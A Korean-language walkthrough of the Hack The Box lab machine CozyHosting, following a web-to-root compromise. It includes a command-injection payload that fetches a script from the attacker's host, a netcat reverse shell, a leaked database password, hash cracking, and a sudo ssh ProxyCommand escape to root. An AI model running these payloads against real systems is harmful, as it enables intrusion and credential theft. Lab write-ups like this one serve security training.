## Nmap
```bash
┌──(kali㉿kali)-[~/HTB/CozyHosting]
└─$ nnmap 10.129.10.145                                             
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-17 10:01 +0900
Nmap scan report for 10.129.10.145
Host is up (0.27s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   270.36 ms 10.10.14.1
2   270.79 ms 10.129.10.145

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.81 seconds

```

 404 에러 페이지 출력 시 Java Spring Boot의 기본 오류 페이지 출력
 
![[Pasted image 20260317102530.png]]

Brute Force 실행
```bash
┌──(kali㉿kali)-[~/HTB/CozyHosting]
└─$ feroxbuster -u http://cozyhosting.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt
                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cozyhosting.htb/
 🚩  In-Scope Url          │ cozyhosting.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/tz
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/language
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/pwd
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/hostname
200      GET        1l        1w      634c http://cozyhosting.htb/actuator
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/lang
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/path
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/home
200      GET        1l      120w     4957c http://cozyhosting.htb/actuator/env
200      GET        1l        1w       15c http://cozyhosting.htb/actuator/health
200      GET       43l      241w    19406c http://cozyhosting.htb/assets/img/pricing-business.png
200      GET       34l      172w    14934c http://cozyhosting.htb/assets/img/pricing-starter.png
200      GET      295l      641w     6890c http://cozyhosting.htb/assets/js/main.js
200      GET       29l      174w    14774c http://cozyhosting.htb/assets/img/pricing-ultimate.png
200      GET       97l      196w     4431c http://cozyhosting.htb/login
200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/logo.png
200      GET       29l      131w    11970c http://cozyhosting.htb/assets/img/pricing-free.png
200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/favicon.png
200      GET        7l     1222w    80420c http://cozyhosting.htb/assets/vendor/bootstrap/js/bootstrap.bundle.min.js
200      GET        1l      313w    14690c http://cozyhosting.htb/assets/vendor/aos/aos.js
200      GET       83l      453w    36234c http://cozyhosting.htb/assets/img/values-3.png
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/spring.jmx.enabled
200      GET        1l        1w      148c http://cozyhosting.htb/actuator/sessions
200      GET       81l      517w    40968c http://cozyhosting.htb/assets/img/hero-img.png
200      GET       73l      470w    37464c http://cozyhosting.htb/assets/img/values-1.png
200      GET        1l      218w    26053c http://cozyhosting.htb/assets/vendor/aos/aos.css
200      GET       79l      519w    40905c http://cozyhosting.htb/assets/img/values-2.png
200      GET        1l      108w     9938c http://cozyhosting.htb/actuator/mappings
200      GET     2397l     4846w    42231c http://cozyhosting.htb/assets/css/style.css
200      GET        1l      625w    55880c http://cozyhosting.htb/assets/vendor/glightbox/js/glightbox.min.js
200      GET        1l      542w   127224c http://cozyhosting.htb/actuator/beans
200      GET     2018l    10020w    95609c http://cozyhosting.htb/assets/vendor/bootstrap-icons/bootstrap-icons.css
200      GET       14l     1684w   143706c http://cozyhosting.htb/assets/vendor/swiper/swiper-bundle.min.js
200      GET        7l     2189w   194901c http://cozyhosting.htb/assets/vendor/bootstrap/css/bootstrap.min.css
200      GET      285l      745w    12706c http://cozyhosting.htb/
[####################] - 5s       170/170     0s      found:27      errors:0      
[####################] - 4s       113/113     29/s    http://cozyhosting.htb/     
```

actuator 목록 확인
```bash
curl -s http://cozyhosting.htb/actuator/mappings | jq .
{
  "contexts": {
    "application": {
      "mappings": {
        "dispatcherServlets": {
          "dispatcherServlet": [
            {
              "handler": "Actuator web endpoint 'mappings'",
              "predicate": "{GET [/actuator/mappings], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",                                                   
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",                                                                                           
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/mappings"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "handler": "Actuator web endpoint 'beans'",
              "predicate": "{GET [/actuator/beans], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",                                                      
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",                                                                                           
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/beans"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
...
...
...


```

정리
```bash
┌──(kali㉿kali)-[~/HTB/CozyHosting]
└─$ curl -s http://cozyhosting.htb/actuator/mappings | jq -c'.contexts.application.mappings.dispatcherServlets
pipe quote> '
{"dispatcherServlet":[{"handler":"Actuator web endpoint 'mappings'","predicate":"{GET [/actuator/mappings], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}","details":{"handlerMethod":{"className":"org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler","name":"handle","descriptor":"(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"},"requestMappingConditions":{"consumes":[],"headers":[],"methods":["GET"],"params":[],"patterns":["/actuator/mappings"],"produces":[{"mediaType":"application/vnd.spring-boot.actuator.v3+json","negated":false},{"mediaType":"application/vnd.spring-boot.actuator.v2+json","negated":false},{"mediaType":"application/json","negated":false}]}}},{"handler":"Actuator web endpoint 'beans'","predicate":"{GET [/actuator/beans], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}","details":{"handlerMethod":{"className":"org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler","name":"handle","descriptor":"(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"},"requestMappingConditions":{"consumes":[],"headers":[],"methods":["GET"],"params":[],"patterns":["/actuator/beans"],"produces":[{"mediaType":"application/vnd.spring-boot.actuator.v3+json","negated":false},{"mediaType":"application/vnd.spring-boot.actuator.v2+json","negated":false},{"mediaType":"application/json","negated":false}]}}},{"handler":"Actuator root web endpoint","predicate":"{GET [/actuator], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}","details":{"handlerMethod":{"className":"org.springframework.boot.actuate.endpoint.web.servlet.WebMvcEndpointHandlerMapping.WebMvcLinksHandler","name":"links","descriptor":"(Ljakarta/servlet/http/HttpServletRequest;Ljakarta/servlet/http/HttpServletResponse;)Ljava/util/Map;"},"requestMappingConditions":{"consumes":[],"headers":[],"methods":["GET"],"params":[],"patterns":["/actuator"],"produces":[{"mediaType":"application/vnd.spring-boot.actuator.v3+json","negated":false},{"mediaType":"application/vnd.spring-boot.actuator.v2+json","negated":false},{"mediaType":"application/json","negated":false}]}}},{"handler":"Actuator web endpoint 'env'","predicate":"{GET [/actuator/env], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}","details":{"handlerMethod":{"className":"org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler","name":"handle","descriptor":"(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"},"requestMappingConditions":{"consumes":[],"headers":[],"methods":["GET"],"params":[],"patterns":["/actuator/env"],"produces":[{"mediaType":"application/vnd.spring-boot.actuator.v3+json","negated":false},{"mediaType":"application/vnd.spring-boot.actuator.v2+json","negated":false},{"mediaType":"application/json","negated":false}]}}},{"handler":"Actuator web endpoint 'env-toMatch'","predicate":"{GET [/actuator/env/{toMatch}], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}","details":{"handlerMethod":{"className":"org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler","name":"handle","descriptor":"(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"},"requestMappingConditions":{"consumes":[],"headers":[],"methods":["GET"],"params":[],"patterns":["/actuator/env/{toMatch}"],"produces":[{"mediaType":"application/vnd.spring-boot.actuator.v3+json","negated":false},{"mediaType":"application/vnd.spring-boot.actuator.v2+json","negated":false},{"mediaType":"application/json","negated":false}]}}},{"handler":"Actuator web endpoint 'sessions'","predicate":"{GET [/actuator/sessions], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}","details":{"handlerMethod":{"className":"org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler","name":"handle","descriptor":"(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"},"requestMappingConditions":{"consumes":[],"headers":[],"methods":["GET"],"params":[],"patterns":["/actuator/sessions"],"produces":[{"mediaType":"application/vnd.spring-boot.actuator.v3+json","negated":false},{"mediaType":"application/vnd.spring-boot.actuator.v2+json","negated":false},{"mediaType":"application/json","negated":false}]}}},{"handler":"Actuator web endpoint 'health'","predicate":"{GET [/actuator/health], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}","details":{"handlerMethod":{"className":"org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler","name":"handle","descriptor":"(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"},"requestMappingConditions":{"consumes":[],"headers":[],"methods":["GET"],"params":[],"patterns":["/actuator/health"],"produces":[{"mediaType":"application/vnd.spring-boot.actuator.v3+json","negated":false},{"mediaType":"application/vnd.spring-boot.actuator.v2+json","negated":false},{"mediaType":"application/json","negated":false}]}}},{"handler":"Actuator web endpoint 'health-path'","predicate":"{GET [/actuator/health/**], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}","details":{"handlerMethod":{"className":"org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler","name":"handle","descriptor":"(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"},"requestMappingConditions":{"consumes":[],"headers":[],"methods":["GET"],"params":[],"patterns":["/actuator/health/**"],"produces":[{"mediaType":"application/vnd.spring-boot.actuator.v3+json","negated":false},{"mediaType":"application/vnd.spring-boot.actuator.v2+json","negated":false},{"mediaType":"application/json","negated":false}]}}},{"handler":"org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#errorHtml(HttpServletRequest, HttpServletResponse)","predicate":"{ [/error], produces [text/html]}","details":{"handlerMethod":{"className":"org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController","name":"errorHtml","descriptor":"(Ljakarta/servlet/http/HttpServletRequest;Ljakarta/servlet/http/HttpServletResponse;)Lorg/springframework/web/servlet/ModelAndView;"},"requestMappingConditions":{"consumes":[],"headers":[],"methods":[],"params":[],"patterns":["/error"],"produces":[{"mediaType":"text/html","negated":false}]}}},{"handler":"org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#error(HttpServletRequest)","predicate":"{ [/error]}","details":{"handlerMethod":{"className":"org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController","name":"error","descriptor":"(Ljakarta/servlet/http/HttpServletRequest;)Lorg/springframework/http/ResponseEntity;"},"requestMappingConditions":{"consumes":[],"headers":[],"methods":[],"params":[],"patterns":["/error"],"produces":[]}}},{"handler":"htb.cloudhosting.compliance.ComplianceService#executeOverSsh(String, String, HttpServletResponse)","predicate":"{POST [/executessh]}","details":{"handlerMethod":{"className":"htb.cloudhosting.compliance.ComplianceService","name":"executeOverSsh","descriptor":"(Ljava/lang/String;Ljava/lang/String;Ljakarta/servlet/http/HttpServletResponse;)V"},"requestMappingConditions":{"consumes":[],"headers":[],"methods":["POST"],"params":[],"patterns":["/executessh"],"produces":[]}}},{"handler":"ParameterizableViewController [view=\"admin\"]","predicate":"/admin"},{"handler":"ParameterizableViewController [view=\"addhost\"]","predicate":"/addhost"},{"handler":"ParameterizableViewController [view=\"index\"]","predicate":"/index"},{"handler":"ParameterizableViewController [view=\"login\"]","predicate":"/login"},{"handler":"ResourceHttpRequestHandler [classpath [META-INF/resources/webjars/]]","predicate":"/webjars/**"},{"handler":"ResourceHttpRequestHandler [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/], ServletContext [/]]","predicate":"/**"}]}      
```

/actuator/sessions 호출하여 kanderson session 값 확인
```bash
┌──(kali㉿kali)-[~/HTB/CozyHosting]
└─$ curl -s http://cozyhosting.htb/actuator/sessions | jq .
{
    "D628FF16D6A5C9D3D3713ED34EEBBE4C": "kanderson"
}

```

세션 변조
![[Pasted image 20260317104943.png]]


K.anderson 로그인 완료
![[Pasted image 20260317105013.png]]

command injection
```bash
host=localhost&username=qq%3bcurl${IFS}http://10.10.14.42/rev.sh${IFS}-o${IFS}/tmp/rev.sh
```

`{IFS}` (Internal Field Separator)

공백( )을 대신하는 쉘의 환경 변수
 `curl${IFS}http...` > `curl http...`로 실행

![[Pasted image 20260317111059.png]]

리버스쉘 연결 성공
```bash
┌──(kali㉿kali)-[~/HTB/CozyHosting]
└─$ rlwrap nc -lnvp 4444                                                                                       
listening on [any] 4444 ...
connect to [10.10.14.42] from (UNKNOWN) [10.129.10.145] 36542
bash: cannot set terminal process group (1002): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$ whoami
whoami
app

```

쉘 안정화
```bash
app@cozyhosting:/app$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
app@cozyhosting:/app$ 
zsh: suspended  rlwrap nc -lnvp 4444
                                                                                                                    
┌──(kali㉿kali)-[~/HTB/CozyHosting]
└─$ stty raw -echo; fg   
```

josh 유저 확인

```bash
app@cozyhosting:/home$ ls
ls
josh

```

cloudhosting-0.0.1.jar 압축해제

```bash
unzip cloudhosting-0.0.1.jar
```

datasource 내에서 password 획득 `Vg&nvzAQ7XxR`
```bash
app@cozyhosting:/tmp/BOOT-INF$ grep -ir 'password'
grep -ir 'password'
grep: lib/spring-security-config-6.0.1.jar: binary file matches
grep: lib/spring-security-web-6.0.1.jar: binary file matches
grep: lib/spring-security-crypto-6.0.1.jar: binary file matches
grep: lib/thymeleaf-spring6-3.1.1.RELEASE.jar: binary file matches
grep: lib/tomcat-embed-core-10.1.5.jar: binary file matches
grep: lib/postgresql-42.5.1.jar: binary file matches
grep: lib/spring-security-core-6.0.1.jar: binary file matches
grep: lib/spring-webmvc-6.0.4.jar: binary file matches
grep: classes/static/assets/vendor/remixicon/remixicon.ttf: binary file matches
classes/application.properties:spring.datasource.password=Vg&nvzAQ7XxR
classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-fill:before { content: "\eecf"; }
classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-line:before { content: "\eed0"; }
classes/static/assets/vendor/remixicon/remixicon.svg:    <glyph glyph-name="lock-password-fill"
classes/static/assets/vendor/remixicon/remixicon.svg:    <glyph glyph-name="lock-password-line"
classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-fill:before { content: "\eecf"; }
classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-line:before { content: "\eed0"; }
grep: classes/static/assets/vendor/remixicon/remixicon.eot: binary file matches
classes/static/assets/vendor/remixicon/remixicon.symbol.svg:</symbol><symbol viewBox="0 0 24 24" id="ri-lock-password-fill">
classes/static/assets/vendor/remixicon/remixicon.symbol.svg:</symbol><symbol viewBox="0 0 24 24" id="ri-lock-password-line">
classes/templates/login.html:                                        <label for="yourPassword" class="form-label">Password</label>
classes/templates/login.html:                                        <input type="password" name="password" class="form-control" id="yourPassword"
classes/templates/login.html:                                        <div class="invalid-feedback">Please enter your password!</div>
classes/templates/login.html:                                    <p th:if="${param.error}" class="text-center small">Invalid username or password</p>
classes/application.properties:spring.datasource.password=Vg&nvzAQ7XxR
grep: classes/htb/cloudhosting/database/CozyUserDetailsService.class: binary file matches
grep: classes/htb/cloudhosting/database/CozyUser.class: binary file matches
grep: classes/htb/cloudhosting/secutiry/SecurityConfig.class: binary file matches
grep: classes/htb/cloudhosting/scheduled/FakeUser.class: binary file matches
app@cozyhosting:/tmp/BOOT-INF$ grep -ir 'password' *
grep -ir 'password' *
grep: classes/static/assets/vendor/remixicon/remixicon.ttf: binary file matches
classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-fill:before { content: "\eecf"; }
classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-line:before { content: "\eed0"; }
classes/static/assets/vendor/remixicon/remixicon.svg:    <glyph glyph-name="lock-password-fill"
classes/static/assets/vendor/remixicon/remixicon.svg:    <glyph glyph-name="lock-password-line"
classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-fill:before { content: "\eecf"; }
classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-line:before { content: "\eed0"; }
grep: classes/static/assets/vendor/remixicon/remixicon.eot: binary file matches
classes/static/assets/vendor/remixicon/remixicon.symbol.svg:</symbol><symbol viewBox="0 0 24 24" id="ri-lock-password-fill">
classes/static/assets/vendor/remixicon/remixicon.symbol.svg:</symbol><symbol viewBox="0 0 24 24" id="ri-lock-password-line">
classes/templates/login.html:                                        <label for="yourPassword" class="form-label">Password</label>
classes/templates/login.html:                                        <input type="password" name="password" class="form-control" id="yourPassword"
classes/templates/login.html:                                        <div class="invalid-feedback">Please enter your password!</div>
classes/templates/login.html:                                    <p th:if="${param.error}" class="text-center small">Invalid username or password</p>

grep: classes/htb/cloudhosting/database/CozyUserDetailsService.class: binary file matches
grep: classes/htb/cloudhosting/database/CozyUser.class: binary file matches
grep: classes/htb/cloudhosting/secutiry/SecurityConfig.class: binary file matches
grep: classes/htb/cloudhosting/scheduled/FakeUser.class: binary file matches

```

application.properties 상세내용 
```bash
app@cozyhosting:/tmp/BOOT-INF$ cat BOOT-INF/classes/application.properties
cat BOOT-INF/classes/application.properties
cat: BOOT-INF/classes/application.properties: No such file or directory
app@cozyhosting:/tmp/BOOT-INF$ cat classes/application.properties
cat classes/application.properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

postgresSQL 연결

```bash
app@cozyhosting:/app$ PGPASSWORD='Vg&nvzAQ7XxR' psql -U postgres -h localhost
PGPASSWORD='Vg&nvzAQ7XxR' psql -U postgres -h localhost
psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# 



```

사용가능한  Database List (backslash el command)
```sql
postgres-# \l
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privil
eges   
-------------+----------+----------+-------------+-------------+----------------
-------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres    
      +
             |          |          |             |             | postgres=CTc/po
stgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres    
      +
             |          |          |             |             | postgres=CTc/po
stgres
(4 rows)

postgres=# \dt
postgres=# \c cozyhosting
   name    |                           password                           | role
  
-----------+--------------------------------------------------------------+-----
--
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi
n

```

획득한 해시값으로 파일 생성
```bash
┌──(kali㉿kali)-[~/HTB/CozyHosting]
└─$ cat cozy.hash        
kanderson:$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
admin:$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
                                                                     
                                                                     
```

유저명이 있으므로 --user 추가  
```bash
┌──(kali㉿kali)-[~/HTB/CozyHosting]
└─$ hashcat cozy.hash --user /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-AMD Ryzen 7 9800X3D 8-Core Processor, 6970/13940 MB (2048 MB allocatable), 4MCU

The following 6 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  25600 | bcrypt(md5($pass))                                         | Generic KDF
  25800 | bcrypt(sha1($pass))                                        | Generic KDF
  30600 | bcrypt(sha256($pass))                                      | Generic KDF
  28400 | bcrypt(sha512($pass))                                      | Generic KDF
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  33800 | WBB4 (Woltlab Burning Board) [bcrypt(bcrypt($pass))]       | Forums, CMS, E-Commerce

Please specify the hash-mode with -m [hash-mode].

Started: Tue Mar 17 14:25:41 2026
Stopped: Tue Mar 17 14:25:41 2026
```

해시 크랙하여 자격증명 획득 `admin/manchesterunited`
```
┌──(kali㉿kali)-[~/HTB/CozyHosting]
└─$ hashcat cozy.hash --user /usr/share/wordlists/rockyou.txt -m 3200

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited

```

josh로 로그인 성공
```bash
app@cozyhosting:/app$ su - josh
su - josh
Password: manchesterunited

josh@cozyhosting:~$ 

```

sudo 권한 확인

```bash
josh@cozyhosting:~$ sudo -l

Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *

```

Proxycommand 이용
```bash
josh@cozyhosting:~$ sudo ssh -o ProxyCommand='touch /tmp/qq' x
sudo ssh -o ProxyCommand='touch /tmp/qq' x
kex_exchange_identification: Connection closed by remote host
Connection closed by UNKNOWN port 65535

josh@cozyhosting:~$ ls -l /tmp/
ls -l /tmp/
total 58908
drwxr-xr-x 4 app  app      4096 Aug 10  2023 BOOT-INF
-rw-r--r-- 1 app  app  60259688 Mar 17 04:37 cloudhosting-0.0.1.jar
-rw-r--r-- 1 app  app      1102 Mar 17 04:40 dev
drwxr-xr-x 2 app  app      4096 Mar 17 00:45 hsperfdata_app
drwxr-xr-x 3 app  app      4096 Aug 10  2023 META-INF
-rw-r--r-- 1 app  app      1500 Mar 17 04:40 null
drwxr-xr-x 3 app  app      4096 Feb  1  1980 org
-rw-r--r-- 1 root root        0 Mar 17 05:41 qq

```

sudo ssh -o 통해서 권한상승 

```bash
sudo ssh -o ProxyCommand='cp /bin/bash /tmp/qq' localhost
kex_exchange_identification: Connection closed by remote host
Connection closed by UNKNOWN port 65535

josh@cozyhosting:~$ sudo ssh -o ProxyCommand='chmod 6777 /tmp/qq' localhost
sudo ssh -o ProxyCommand='chmod 6777 /tmp/qq' localhost
kex_exchange_identification: Connection closed by remote host
Connection closed by UNKNOWN port 65535


```

```bash
josh@cozyhosting:~$ /tmp/qq -p
/tmp/qq -p
qq-5.1# id
id
uid=1003(josh) gid=1003(josh) euid=0(root) egid=0(root) groups=0(root),1003(josh)

sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
whoami
root
```

root.txt 획득
![[Pasted image 20260317151026.png]]

